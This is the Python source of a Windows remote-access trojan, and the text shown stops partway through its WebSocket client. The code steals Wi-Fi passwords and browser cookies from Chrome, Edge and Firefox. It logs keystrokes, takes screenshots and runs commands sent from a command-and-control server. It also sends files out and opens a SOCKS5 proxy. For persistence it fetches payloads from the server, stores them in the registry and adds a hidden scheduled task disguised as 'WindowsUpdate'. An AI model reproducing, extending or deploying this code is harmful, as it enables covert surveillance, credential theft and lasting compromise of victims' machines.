import os
import sys
import subprocess
import importlib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import json
import base64
import sqlite3
import time
import platform
import io
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import pyautogui
import win32crypt
import winreg
from datetime import datetime, timedelta
import shutil
import ctypes
import psutil
import socket
import threading
import select
from pynput import keyboard
import configparser
import xml.etree.ElementTree as ET
import socketio
import websocket
import zipfile
import random, inspect, tempfile

# ======================
# Configuration
# ======================

# Configure root logger once at module level
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(tempfile.gettempdir(), 'agent.log')),
        logging.StreamHandler()
    ]
)

class Config:
    def __init__(self):
        self.C2_SERVER = "https://192.168.147.1"
        self.AES_KEY = b"32bytekey-ultra-secure-123456789"
        self.AES_IV = b"16byteiv-9876543"
        self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.CHECKIN_INTERVAL = 10
        self.SOCKS5_PORT = 1080
        self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
        self.DEBUG = True
        self.TAKE_SCREENSHOTS = True
        self.SCREENSHOT_FREQUENCY = 10

# ======================
# Encryption
# ======================
class Crypto:
    def __init__(self, key, iv):
        if len(key) not in {16, 24, 32}:
            raise ValueError(f"Invalid AES key length ({len(key)} bytes)")
        if len(iv) != 16:
            raise ValueError(f"Invalid AES IV length ({len(iv)} bytes)")
        self.key = key
        self.iv = iv

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        ct_bytes = cipher.encrypt(padded_data)
        return base64.b64encode(ct_bytes).decode()

    def decrypt(self, enc_data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ct = base64.b64decode(enc_data)
        pt = cipher.decrypt(ct)
        return json.loads(unpad(pt, AES.block_size))

# ======================
# Credential Harvester
# ======================
class CredentialHarvester:
    @staticmethod
    def get_wifi_passwords():
        try:
            profiles = []
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
            profiles = [line.split(":")[1].strip() for line in results if "All User Profile" in line]
            
            wifi_passwords = []
            for profile in profiles:
                try:
                    password_result = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8', errors='ignore').split('\n')
                    password = [line.split(":")[1].strip() for line in password_result if "Key Content" in line][0]
                    wifi_passwords.append({
                        "ssid": profile,
                        "password": password
                    })
                except:
                    continue
            
            return wifi_passwords
        except:
            return []

# ======================
# Cookie Stealer
# ======================
class CookieStealer:
    def __init__(self):
        self.logger = logging.getLogger('agent.cookies')
        self.chrome_debug_port = 9222
        self.edge_debug_port = 9223
        self.timeout = 10
        self.unique_domains = set()
        
        self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
        self.CHROME_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
        self.CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')

        self.EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        self.EDGE_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Microsoft\Edge\User Data'
        self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')

        self.FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')

        self.logger.debug("CookieStealer initialized with configurations:")
        self.logger.debug(f"Chrome Path: {self.CHROME_PATH}")
        self.logger.debug(f"Chrome User Data Dir: {self.CHROME_USER_DATA_DIR}")
        self.logger.debug(f"Edge Path: {self.EDGE_PATH}")
        self.logger.debug(f"Edge User Data Dir: {self.EDGE_USER_DATA_DIR}")
        self.logger.debug(f"Firefox Profile Dir: {self.FIREFOX_PROFILE_DIR}")

    def steal_cookies(self):
        """Main method to steal cookies from all browsers"""
        self.logger.info("Starting cookie stealing process")
        results = []
        
        try:
            # Chrome
            self.logger.debug("Attempting to steal Chrome cookies")
            chrome_data = self._process_browser_cookies(
                'chrome',
                self.CHROME_PATH,
                self.chrome_debug_port,
                self.CHROME_USER_DATA_DIR
            )
            if chrome_data:
                results.append(chrome_data)
                self.logger.info("Successfully stole Chrome cookies")
            else:
                self.logger.warning("Failed to steal Chrome cookies")
            
            # Edge
            self.logger.debug("Attempting to steal Edge cookies")
            edge_data = self._process_browser_cookies(
                'edge',
                self.EDGE_PATH,
                self.edge_debug_port,
                self.EDGE_USER_DATA_DIR
            )
            if edge_data:
                results.append(edge_data)
                self.logger.info("Successfully stole Edge cookies")
            else:
                self.logger.warning("Failed to steal Edge cookies")
            
            # Firefox
            self.logger.debug("Attempting to steal Firefox cookies")
            firefox_data = self._process_firefox_cookies()
            if firefox_data:
                results.append(firefox_data)
                self.logger.info("Successfully stole Firefox cookies")
            else:
                self.logger.warning("Failed to steal Firefox cookies")
            
            self.logger.info(f"Cookie stealing completed. Retrieved from {len(results)} browsers")
            return results
            
        except Exception as e:
            self.logger.error(f"Critical error in steal_cookies: {str(e)}", exc_info=True)
            return results

    def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
        """Process Chrome/Edge cookies"""
        self.logger.debug(f"Starting {browser_name} cookie processing")
        try:
            if not os.path.exists(browser_path):
                self.logger.error(f"{browser_name} not found at: {browser_path}")
                return None

            self.logger.debug(f"Starting {browser_name} in debug mode on port {port}")
            proc = self._start_browser_debug(browser_path, port, user_data_dir)
            if not proc:
                self.logger.error(f"Failed to start {browser_name} debug session")
                return None

            time.sleep(5)
            
            self.logger.debug(f"Attempting to retrieve {browser_name} cookies via debug protocol")
            cookies = self._get_cookies_via_debug(port)
            
            if not cookies:
                self.logger.warning(f"No cookies retrieved from {browser_name}")
                return None

            self.logger.debug(f"Terminating {browser_name} process")
            proc.terminate()
            proc.wait()

            self.logger.debug(f"Transforming {browser_name} cookies to standard format")
            transformed = self._transform_cookies(cookies)
            
            self.logger.debug(f"Packaging {browser_name} cookies for transmission")
            return self._package_cookies(transformed, browser_name)

        except Exception as e:
            self.logger.error(f"{browser_name} cookie processing failed: {str(e)}", exc_info=True)
            return None

    def _process_firefox_cookies(self):
        """Process Firefox cookies"""
        self.logger.debug("Starting Firefox cookie processing")
        try:
            self.logger.debug("Searching for Firefox profile")
            profile_dir = self._find_firefox_profile()
            if not profile_dir:
                self.logger.error("No Firefox profile found")
                return None

            self.logger.debug(f"Found Firefox profile at: {profile_dir}")

            self.logger.debug("Extracting cookies from Firefox SQLite database")
            cookies = self._extract_firefox_cookies(profile_dir)
            if not cookies:
                self.logger.warning("No cookies found in Firefox database")
                return None

            self.logger.debug("Transforming Firefox cookies to standard format")
            transformed = self._transform_cookies(cookies)
            
            self.logger.debug("Packaging Firefox cookies for transmission")
            return self._package_cookies(transformed, 'firefox')

        except Exception as e:
            self.logger.error(f"Firefox cookie processing failed: {str(e)}", exc_info=True)
            return None

    def _start_browser_debug(self, browser_path, port, user_data_dir):
        """Start browser in debug mode with detailed logging"""
        self.logger.debug(f"Attempting to start browser: {browser_path}")
        try:
            self.logger.debug(f"Killing existing {os.path.basename(browser_path)} processes")
            self._kill_browser(os.path.basename(browser_path))
            
            command = [
                browser_path,
                f'--remote-debugging-port={port}',
                '--remote-allow-origins=*',
                '--headless',
                f'--user-data-dir={user_data_dir}'
            ]
            self.logger.debug(f"Browser command: {' '.join(command)}")
            
            proc = subprocess.Popen(command, 
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE)
            
            def log_stream(stream, stream_type):
                for line in iter(stream.readline, b''):
                    self.logger.debug(f"Browser {stream_type}: {line.decode().strip()}")
            
            threading.Thread(target=log_stream, args=(proc.stdout, 'stdout')).start()
            threading.Thread(target=log_stream, args=(proc.stderr, 'stderr')).start()
            
            return proc
            
        except Exception as e:
            self.logger.error(f"Failed to start browser: {str(e)}", exc_info=True)
            return None

    def _get_cookies_via_debug(self, port):
        """Get cookies using Chrome DevTools Protocol with detailed logging"""
        self.logger.debug(f"Attempting to connect to debug port {port}")
        try:
            debug_url = f'http://localhost:{port}/json'
            self.logger.debug(f"Fetching debug targets from: {debug_url}")
            
            response = requests.get(debug_url, timeout=self.timeout)
            response.raise_for_status()
            
            data = response.json()
            if not data:
                self.logger.warning("No debug targets found")
                return []
                
            ws_url = data[0]['webSocketDebuggerUrl']
            self.logger.debug(f"Connecting to WebSocket: {ws_url}")
            
            ws = websocket.create_connection(ws_url, timeout=self.timeout)
            
            self.logger.debug("Sending cookie request via WebSocket")
            ws.send(json.dumps({
                'id': 1,
                'method': 'Network.getAllCookies'
            }))
            
            response = json.loads(ws.recv())
            self.logger.debug(f"Received {len(response['result']['cookies'])} cookies")
            return response['result']['cookies']
            
        except requests.exceptions.RequestException as e:
            self.logger.error(f"HTTP request failed: {str(e)}")
            return []
        except websocket.WebSocketException as e:
            self.logger.error(f"WebSocket error: {str(e)}")
            return []
        except Exception as e:
            self.logger.error(f"Unexpected debug protocol error: {str(e)}", exc_info=True)
            return []
        finally:
            if 'ws' in locals():
                try:
                    ws.close()
                except:
                    pass

    def _extract_firefox_cookies(self, profile_dir):
        """Extract cookies from Firefox SQLite database with detailed logging"""
        self.logger.debug(f"Extracting cookies from Firefox profile: {profile_dir}")
        try:
            cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
            if not os.path.exists(cookies_db):
                self.logger.error(f"Firefox cookies database not found at: {cookies_db}")
                return []
                
            self.logger.debug(f"Opening SQLite database: {cookies_db}")
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            
            cursor.execute("PRAGMA table_info(moz_cookies)")
            columns = cursor.fetchall()
            self.logger.debug(f"Firefox cookie table columns: {columns}")
            
            cursor.execute("SELECT COUNT(*) FROM moz_cookies")
            count = cursor.fetchone()[0]
            self.logger.debug(f"Found {count} cookies in database")
            
            cursor.execute("""
                SELECT 
                    name, value, host, path, expiry, 
                    isSecure, isHttpOnly, sameSite 
                FROM moz_cookies
            """)
            
            cookies = []
            for row in cursor.fetchall():
                try:
                    cookies.append((
                        str(row[0]), str(row[1]), str(row[2]), str(row[3]),
                        int(row[4]) if row[4] else 0,
                        bool(row[5]), bool(row[6]),
                        str(row[7]) if row[7] else 'none'
                    ))
                except Exception as e:
                    self.logger.warning(f"Error processing cookie row: {str(e)}")
                    continue
            
            conn.close()
            self.logger.debug(f"Successfully extracted {len(cookies)} cookies")
            return cookies
            
        except sqlite3.Error as e:
            self.logger.error(f"SQLite error: {str(e)}")
            return []
        except Exception as e:
            self.logger.error(f"Unexpected Firefox cookie extraction error: {str(e)}", exc_info=True)
            return []

    def _find_firefox_profile(self):
        """Locate Firefox profile directory"""
        try:
            profiles_ini = os.path.join(self.FIREFOX_PROFILE_DIR, 'profiles.ini')
            if not os.path.exists(profiles_ini):
                return None
                
            config = configparser.ConfigParser()
            config.read(profiles_ini)
            
            for section in config.sections():
                if config.has_option(section, 'Path'):
                    path = config.get(section, 'Path')
                    if config.has_option(section, 'IsRelative') and config.getboolean(section, 'IsRelative'):
                        path = os.path.join(self.FIREFOX_PROFILE_DIR, path)
                    return path
            return None
        except Exception as e:
            self.logger.error(f"Error finding Firefox profile: {str(e)}")
            return None

    def _kill_browser(self, process_name):
        """Kill all instances of browser process"""
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process_name.lower():
                    proc.kill()
        except Exception as e:
            self.logger.warning(f"Error killing browser processes: {str(e)}")

    def _transform_cookies(self, cookies):
        """Transform cookies to standard format"""
        transformed = []
        for cookie in cookies:
            try:
                transformed.append({
                    'name': cookie.get('name', ''),
                    'value': cookie.get('value', ''),
                    'domain': cookie.get('domain', ''),
                    'path': cookie.get('path', '/'),
                    'expires': cookie.get('expires', 0),
                    'secure': cookie.get('secure', False),
                    'httpOnly': cookie.get('httpOnly', False),
                    'sameSite': cookie.get('sameSite', 'None')
                })
            except Exception as e:
                self.logger.warning(f"Error transforming cookie: {str(e)}")
                continue
        return transformed

    def _package_cookies(self, cookies, browser):
        """Package cookies for transmission"""
        return {
            'browser': browser,
            'count': len(cookies),
            'cookies': cookies,
            'timestamp': datetime.now().isoformat()
        }

# ======================
# System Functions
# ======================
class SystemUtils:
    @staticmethod
    def take_screenshot():
        logger = logging.getLogger('agent.screenshot')
        try:
            logger.debug("Attempting to take screenshot")
            
            if platform.system() == 'Windows':
                logger.debug("Windows system detected, setting DISPLAY environment")
                os.environ['DISPLAY'] = ':0.0'
            
            logger.debug("Capturing screen with pyautogui")
            screenshot = pyautogui.screenshot()
            
            logger.debug("Converting screenshot to bytes buffer")
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            buffered.seek(0)
            
            logger.debug("Encoding screenshot to base64")
            screenshot_data = base64.b64encode(buffered.read()).decode('utf-8')
            
            logger.debug("Screenshot captured and encoded successfully")
            return screenshot_data
            
        except ImportError as e:
            logger.error(f"Required library not available: {str(e)}", exc_info=True)
            return None
        except PermissionError as e:
            logger.error(f"Permission denied when taking screenshot: {str(e)}", exc_info=True)
            return None
        except Exception as e:
            logger.error(f"Unexpected error during screenshot capture: {str(e)}", exc_info=True)
            return None

    @staticmethod
    def get_system_info():
        logger = logging.getLogger('agent.systeminfo')
        try:
            info = {
                "hostname": platform.node(),
                "username": os.getlogin(),
                "os": platform.platform(),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "ram": round(psutil.virtual_memory().total / (1024**3), 2),
                "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
                "processes": []
            }

            for proc in sorted(psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']), 
                             key=lambda p: p.info['cpu_percent'], reverse=True)[:10]:
                info["processes"].append({
                    "pid": proc.info['pid'],
                    "name": proc.info['name'],
                    "user": proc.info['username'],
                    "cpu": proc.info['cpu_percent']
                })

            logger.debug("Successfully gathered system information")
            return info
        except Exception as e:
            logger.error(f"Error getting system info: {str(e)}", exc_info=True)
            return {}

    @staticmethod
    def execute_command(cmd):
        logger = logging.getLogger('agent.command')
        try:
            logger.debug(f"Executing command: {cmd}")
            result = subprocess.run(cmd, shell=True, 
                                  capture_output=True, text=True, 
                                  timeout=30)
            logger.debug(f"Command executed with return code: {result.returncode}")
            return {
                "output": result.stdout,
                "error": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            logger.warning("Command timed out after 30 seconds")
            return {
                "error": "Command timed out after 30 seconds",
                "returncode": -1
            }
        except Exception as e:
            logger.error(f"Command execution failed: {str(e)}", exc_info=True)
            return {
                "error": str(e),
                "returncode": -1
            }

    @staticmethod
    def upload_file(filepath):
        logger = logging.getLogger('agent.upload')
        try:
            if not os.path.exists(filepath):
                logger.error(f"File not found: {filepath}")
                return {"error": "File not found"}
            
            file_size = os.path.getsize(filepath)
            if file_size > Config.MAX_UPLOAD_SIZE:
                logger.error(f"File too large: {file_size} bytes")
                return {"error": "File too large"}
            
            logger.debug(f"Reading file: {filepath}")
            with open(filepath, "rb") as f:
                file_data = f.read()
            
            logger.debug(f"Successfully read {len(file_data)} bytes")
            return {
                "filename": os.path.basename(filepath),
                "data": base64.b64encode(file_data).decode('utf-8'),
                "size": len(file_data)
            }
        except Exception as e:
            logger.error(f"Upload failed: {str(e)}", exc_info=True)
            return {"error": str(e)}

    @staticmethod
    def download_file(filename, data):
        logger = logging.getLogger('agent.download')
        try:
            logger.debug(f"Decoding file data for {filename}")
            file_data = base64.b64decode(data)
            
            downloads_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
            filepath = os.path.join(downloads_dir, filename)
            
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filename)
                filepath = os.path.join(downloads_dir, f"{name}_{counter}{ext}")
                counter += 1
            
            logger.debug(f"Writing file to: {filepath}")
            with open(filepath, "wb") as f:
                f.write(file_data)
            
            logger.info(f"Successfully downloaded file to {filepath}")
            return {"status": "success", "path": filepath}
        except Exception as e:
            logger.error(f"Download failed: {str(e)}", exc_info=True)
            return {"error": str(e)}

# ======================
# Persistence
# ======================
class Persistence:
    @staticmethod
    def _download_to_registry(url, value_name, c2_server):
        logger = logging.getLogger('agent.persistence.download')
        try:
            logger.info(f"Attempting to download content from {url}")
            response = requests.get(url, verify=False)
            response.raise_for_status()
            logger.debug(f"Successfully downloaded {len(response.content)} bytes")
            
            # More reliable admin check
            is_admin = False
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                logger.debug(f"Admin privileges: {is_admin}")
            except Exception as e:
                logger.debug(f"Admin check failed: {str(e)}")
                # Fallback method
                try:
                    test_key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
                        0,
                        winreg.KEY_WRITE | winreg.KEY_READ
                    )
                    winreg.CloseKey(test_key)
                    is_admin = True
                except WindowsError:
                    is_admin = False
            
            reg_path = (r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo" if is_admin 
                    else r"Software\Microsoft\Accessibility\Setup")
            root_key = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER
            
            logger.info(f"Storing {value_name} in registry at {root_key}\\{reg_path}")
            
            try:
                # Ensure we have write permissions by using correct access flags
                access = winreg.KEY_WRITE | winreg.KEY_READ
                key = winreg.CreateKeyEx(root_key, reg_path, 0, access)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
                winreg.CloseKey(key)
                logger.info(f"Successfully stored {value_name} in registry")
                return True
            except Exception as e:
                logger.error(f"Failed to write to registry: {str(e)}")
                return False
                
        except requests.RequestException as e:
            logger.error(f"Download failed: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error in _download_to_registry: {str(e)}", exc_info=True)
            return False

    @staticmethod
    def _generate_batch_runner():
        logger = logging.getLogger('agent.persistence.generator')
        try:
            batch_lines = [
                '@echo off',
                'setlocal enabledelayedexpansion',
                '',
                ':: Configure paths',
                'set "extract_root=%public%"',
                'set "python_dir=%extract_root%\\documents"',
                'set "python_exe=%python_dir%\\python.exe"',
                'set "py_script=%python_dir%\\run_lube.py"',
                '',
                'if exist "%python_exe%" (',
                '    goto HavePython',
                ')',
                '',
                'set "ps_command=$ErrorActionPreference = \'Stop\';"',
                'set "ps_command=%ps_command% $regPaths = @(\'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\',\'HKCU:\\Software\\Microsoft\\Accessibility\\Setup\');"',
                'set "ps_command=%ps_command% foreach ($path in $regPaths) {"',
                'set "ps_command=%ps_command%     if (Test-Path $path) {"',
                'set "ps_command=%ps_command%         $val = Get-ItemProperty -Path $path -Name \'engine\' -ErrorAction SilentlyContinue;"',
                'set "ps_command=%ps_command%         if ($val -and $val.engine) {"',
                'set "ps_command=%ps_command%             $zipPath = Join-Path $env:TEMP \'python_engine.zip\';"',
                'set "ps_command=%ps_command%             [IO.File]::WriteAllBytes($zipPath, $val.engine);"',
                'set "ps_command=%ps_command%             $extractTo = \'%extract_root%\';"',
                'set "ps_command=%ps_command%             if (-not (Test-Path $extractTo)) { New-Item -Path $extractTo -ItemType Directory -Force | Out-Null };"',
                'set "ps_command=%ps_command%             Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force;"',
                'set "ps_command=%ps_command%             Remove-Item $zipPath -Force;"',
                'set "ps_command=%ps_command%             $pythonPath = Join-Path $extractTo \'documents\\python.exe\';"',
                'set "ps_command=%ps_command%             if (Test-Path $pythonPath) { exit 0 }"',
                'set "ps_command=%ps_command%         }"',
                'set "ps_command=%ps_command%     }"',
                'set "ps_command=%ps_command% };"',
                'set "ps_command=%ps_command% throw \'Failed to extract Python from registry\'"',
                '',
                'powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_command%"',
                'if errorlevel 1 (',
                '    echo ERROR: Failed to extract Python from registry',
                '    pause',
                '    exit /b 1',
                ')',
                '',
                ':HavePython',
                '',
                '(',
                'echo import winreg',
                'echo import sys',
                'echo.',
                'echo try:',
                'echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
                'echo     value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
                'echo     script = value.decode(\'utf-8\'^) if regtype == winreg.REG_BINARY else value',
                'echo     exec(script^)',
                'echo except Exception as e:',
                'echo     print(f\'Error: {e}\'^)',
                'echo     sys.exit(1^)',
                ') > "%py_script%" 2>nul',
                '',
                '"%python_exe%" "%py_script%"',
                'if errorlevel 1 (',
                '    echo ERROR: Python script execution failed',
                '    pause',
                '    exit /b 1',
                ')',
                '',
                'endlocal'
            ]
            
            batch_code = '\r\n'.join(batch_lines)
            return base64.b64encode(batch_code.encode('utf-8')).decode('utf-8')
        except Exception as e:
            logger.error(f"Failed to generate batch runner: {str(e)}", exc_info=True)
            raise

    @staticmethod
    def _create_scheduled_task():
        logger = logging.getLogger('agent.persistence.task')
        try:
            task_name = "WindowsUpdate"
            logger.debug(f"Generated task name: {task_name}")
            
            encoded_batch = Persistence._generate_batch_runner()
            logger.debug("Successfully generated encoded batch runner")
            
            # Create batch file in Public directory
            batch_path = os.path.join(os.getenv('PUBLIC')+"\\documents\\", f'runner.cmd')
            logger.debug(f"Writing batch runner to {batch_path}")
            
            decoded_batch = base64.b64decode(encoded_batch).decode('utf-8')
            with open(batch_path, 'w') as f:
                f.write(decoded_batch)
            
            logger.info(f"Batch runner created at {batch_path}")
            
            # Create task XML
            task_xml_lines = [
                '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
                '    <Triggers>',
                '        <LogonTrigger>',
                '            <Enabled>true</Enabled>',
                '        </LogonTrigger>',
                '    </Triggers>',
                '    <Principals>',
                '        <Principal id="Author">',
                '            <RunLevel>HighestAvailable</RunLevel>',
                '        </Principal>',
                '    </Principals>',
                '    <Settings>',
                '        <Hidden>true</Hidden>',
                '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
                '    </Settings>',
                '    <Actions Context="Author">',
                '        <Exec>',
                '            <Command>conhost</Command>',
                f'            <Arguments>--headless cmd /c "{batch_path}"</Arguments>',
                '        </Exec>',
                '    </Actions>',
                '</Task>'
            ]
            
            xml_path = os.path.join(os.getenv('TEMP'), f'task_{random.randint(1000,9999)}.xml')
            logger.debug(f"Writing task XML to {xml_path}")
            
            with open(xml_path, 'w') as f:
                f.write("\n".join(task_xml_lines))
            
            logger.info(f"Creating scheduled task '{task_name}'")
            result = subprocess.run(
                ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                logger.info(f"Successfully created task '{task_name}'")
            else:
                logger.error(f"Failed to create task. STDOUT: {result.stdout} STDERR: {result.stderr}")
                return None
            
            return task_name
        except Exception as e:
            logger.error(f"Failed to create scheduled task: {str(e)}", exc_info=True)
            return None
        finally:
            try:
                if 'xml_path' in locals() and os.path.exists(xml_path):
                    os.remove(xml_path)
                    logger.debug(f"Cleaned up temporary XML file: {xml_path}")
            except Exception as e:
                logger.error(f"Failed to clean up XML file: {str(e)}")

    @staticmethod
    def install(c2_server):
        logger = logging.getLogger('agent.persistence.install')
        try:
            logger.info(f"Starting persistence installation with C2: {c2_server}")
            
            if platform.system() != "Windows":
                logger.error("Non-Windows platform detected")
                return {"status": "error", "message": "Only Windows supported"}
            
            logger.info("Downloading and storing engine (Python package)")
            if not Persistence._download_to_registry(f"{c2_server}//a/p", "engine", c2_server):
                logger.error("Failed to store engine in registry")
                return {"status": "error", "message": "Failed to store engine in registry"}
            
            logger.info("Downloading and storing lube (Python script)")
            if not Persistence._download_to_registry(f"{c2_server}//a/d", "lube", c2_server):
                logger.error("Failed to store lube in registry")
                return {"status": "error", "message": "Failed to store lube in registry"}
            
            logger.info("Creating scheduled task")
            task_name = Persistence._create_scheduled_task()
            if not task_name:
                logger.error("Failed to create scheduled task")
                return {"status": "error", "message": "Failed to create scheduled task"}
            
            success_msg = "Persistence installed successfully"
            logger.info(success_msg)
            return {
                "status": "success", 
                "message": success_msg,
                "registry_entries": ["engine", "lube"],
                "task_name": task_name,
                "extraction_path": r"%PUBLIC%\documents",
                "execution_method": "python_from_registry"
            }
            
        except Exception as e:
            logger.error(f"Installation failed: {str(e)}", exc_info=True)
            return {"status": "error", "message": str(e)}
        
# ======================
# SOCKS5 Proxy
# ======================
class SOCKS5Proxy:
    def __init__(self, port):
        self.logger = logging.getLogger('agent.socks5')
        self.port = port
        self.running = False
        self.server_socket = None
        self.connections = {}

    def start(self):
        if self.running:
            return {"status": "error", "message": "Proxy already running"}
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('127.0.0.1', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self._accept_connections, daemon=True).start()
            return {"status": "success", "message": f"SOCKS5 proxy started on port {self.port}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        return {"status": "success", "message": "SOCKS5 proxy stopped"}

    def _accept_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(conn, addr),
                    daemon=True
                ).start()
            except:
                break

    def _handle_client(self, conn, addr):
        try:
            conn.recv(256)
            conn.sendall(b"\x05\x00")
            
            request = conn.recv(4)
            if request[0] != 0x05 or request[1] != 0x01:
                conn.close()
                return
            
            addr_type = request[3]
            if addr_type == 0x01:
                target_host = socket.inet_ntoa(conn.recv(4))
            elif addr_type == 0x03:
                length = ord(conn.recv(1))
                target_host = conn.recv(length).decode()
            else:
                conn.close()
                return
            
            target_port = int.from_bytes(conn.recv(2), 'big')
            
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((target_host, target_port))
            
            conn.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (self.port).to_bytes(2, 'big'))
            
            self._relay_data(conn, target_sock)
        except Exception as e:
            pass
        finally:
            conn.close()

    def _relay_data(self, client_sock, target_sock):
        sockets = [client_sock, target_sock]
        while self.running:
            try:
                read_sockets, _, _ = select.select(sockets, [], [], 1)
                for sock in read_sockets:
                    data = sock.recv(4096)
                    if not data:
                        return
                    
                    if sock == client_sock:
                        target_sock.sendall(data)
                    else:
                        client_sock.sendall(data)
            except:
                break

# ======================
# Keylogger
# ======================
class Keylogger:
    def __init__(self):
        self.logger = logging.getLogger('agent.keylogger')
        self.log = ""
        self.listener = None
        self.running = False

    def start(self):
        if self.running:
            return {"status": "error", "message": "Keylogger already running"}
        
        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_key_press)
        self.listener.start()
        return {"status": "success", "message": "Keylogger started"}

    def stop(self):
        if not self.running:
            return {"status": "error", "message": "Keylogger not running"}
        
        self.running = False
        if self.listener:
            self.listener.stop()
        return {"status": "success", "message": "Keylogger stopped"}

    def get_logs(self):
        logs = self.log
        self.log = ""
        return logs

    def _on_key_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            else:
                self.log += f"[{key}]"

# ======================
# WebSocket Client
# ======================
class WebSocketClient:
    def __init__(self, agent_id, crypto, server_url, config):
        self.logger = logging.getLogger('agent.websocket')
        self.agent_id = agent_id
        self.crypto = crypto
        self.config = config
        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/socket.io'
        self.socket = None
        self.connected = False
        self.current_dir = os.getcwd()
        self._connection_timeout = 10  # seconds

    def _setup_event_handlers(self):
        @self.socket.on('execute_command', namespace='/terminal')
        def on_command(data):
            try:
                self.logger.info(f"Executing command: {data.get('command')}")
                
                result = self._execute_command(data.get('command', ''))
                
                response = {
                    'agent_id': self.agent_id,
                    'command': data.get('command', ''),
                    'output': result.get('output', ''),
                    'error': result.get('error', ''),
                    'current_dir': result.get('current_dir', '')
                }
                
                self.logger.debug(f"Sending command result: {response}")
                self.socket.emit('command_result', response, namespace='/terminal')
                
            except Exception as e:
                self.logger.error(f"Command handling failed: {str(e)}")
                self.socket.emit('command_result', {
                    'agent_id': self.agent_id,
                    'error': f"Command processing error: {str(e)}",
                    'current_dir': self.current_dir
                }, namespace='/terminal')

    def connect(self):
        try:
            self.logger.info(f"Connecting to WebSocket at {self.server_url}")
            
            self.socket = socketio.Client(
                ssl_verify=False,
                reconnection=True,
                reconnection_attempts=5,
                reconnection_delay=3000,
                logger=True,
                engineio_logger=True
            )

            connection_timeout = 10  # seconds
            connected_event = threading.Event()

            @self.socket.on('connect', namespace='/terminal')
            def on_connect():
                self.logger.info("WebSocket connected, authenticating...")
                try:
                    auth_data = {
                        'agent_id': self.agent_id,
                        'auth_token': self.crypto.encrypt({
                            'agent_id': self.agent_id,
                            'timestamp': int(time.time())
                        })
                    }
                    self.socket.emit('agent_connect', auth_data, namespace='/terminal')
                    self._setup_event_handlers()
                    self.connected = True
                    connected_event.set()
                except Exception as e:
                    self.logger.error(f"Authentication failed: {str(e)}")

            @self.socket.on('disconnect', namespace='/terminal')
            def on_disconnect():
